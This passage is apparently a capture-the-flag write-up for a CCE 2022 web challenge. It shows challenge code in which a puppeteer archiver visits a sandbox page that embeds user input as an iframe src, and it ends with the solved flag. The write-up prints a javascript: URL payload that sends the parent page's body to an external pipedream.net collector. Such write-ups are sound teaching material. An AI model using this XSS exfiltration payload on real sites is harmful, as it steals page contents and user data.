+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">archive_dir</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">ARCHIVE_DIR</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">hash</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">existsSync</span>(<span style="color:#a6e22e">archive_dir</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">mkdirSync</span>(<span style="color:#a6e22e">archive_dir</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">timestamp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">moment</span>().<span style="color:#a6e22e">format</span>(<span style="color:#e6db74">&#39;YYYYMMDDHHmmssSSS&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">archive_path</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">archive_dir</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">timestamp</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">ARCHIVE_EXT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">browser</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">puppeteer</span>.<span style="color:#a6e22e">launch</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">executablePath</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;./chrome/chrome&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ignoreDefaultArgs</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">args</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--headless&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--diable-gpu&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--disable-dev-shm-usage&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--ignore-certificate-errors&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--hide-scrollbars&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--window-size=1280,720&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;--js-flags=--noexpose_wasm,--jitless&#34;</span>
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">newPage</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">sandbox_url</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">url</span>, { <span style="color:#a6e22e">timeout</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">3000</span> });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#ae81ff">3000</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">screenshot</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fullPage</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">path</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">archive_path</span>,
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">saveArchive</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// /app/lib.js
+</span></span></span></code></pre></div><p>There is a function called saveArchive() in lib.js. This function uses puppeteer to open an arbitrary browser in the background. After that, the file-related logic is moved to the sandbox url after execution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/archiveSave&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">url</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">!</span>(<span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;http://&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">url</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#39;https://&#39;</span>)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>, { <span style="color:#a6e22e">error</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid URL.&#39;</span> });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">saveArchive</span>(<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>, { <span style="color:#a6e22e">success</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">`Sucessfully saved archive for </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span> });
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>, { <span style="color:#a6e22e">error</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Oops, an unknown error has occured.&#39;</span> });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// /app/route/routes.js
+</span></span></span></code></pre></div><p>The saveArchive() function is called when creating an archive.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">encode</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;html-entities&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;head&gt;&lt;title&gt;sandbox&lt;/title&gt;&lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FLAG = &#34;cce2022{this_is_not_real_flag}&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;iframe src=&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">url</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34; style=&#34;width: 100%; height: 100%; border: 0&#34;&gt;&lt;/iframe&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;`</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>,<span style="color:#e6db74">&#34;text/html&#34;</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">data</span>);
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">PORT</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// /sandbox/src/index.js
+</span></span></span></code></pre></div><p>When I checked the code of /sandbox/src/index.js, I could see that there was a FLAG in the Dom. And it gets the value of the url parameter from the iframe part and passes it as the value of src as it is. We can trigger XSS because we can manipulate the value of src at will.
+<!-- raw HTML omitted --></p>
+<p>The structure of the dome is as above. The vulnerability occurs in Iframes. But the flag is in Parent Dom.</p>
+<p><img src="https://cdn.discordapp.com/attachments/966582609377361920/1023369845242347611/2022-09-25_08.06.17.png" alt=""></p>
+<p>So we must read the value of window.parent.document.body. If the value of document.body is read, the document of the only iframe is read.</p>
+<pre tabindex="0"><code class="language-plain-text" data-lang="plain-text">http://sandbox.bluearchive.kr:31337/?url=javascript:location.href=%2527https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/%2527%252Bbtoa(window.parent.document.body.innerHTML)
+</code></pre><p>We can get the flags by sending the above payload to the archive creation logic</p>
+<p><img src="https://cdn.discordapp.com/attachments/966582609377361920/1023371633534181396/2022-09-25_08.13.21.png" alt=""></p>
+<pre tabindex="0"><code class="language-plain-text" data-lang="plain-text">cce2022{65f6d035ca6640b9ac8e19ff725a747f}
+</code></pre>
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
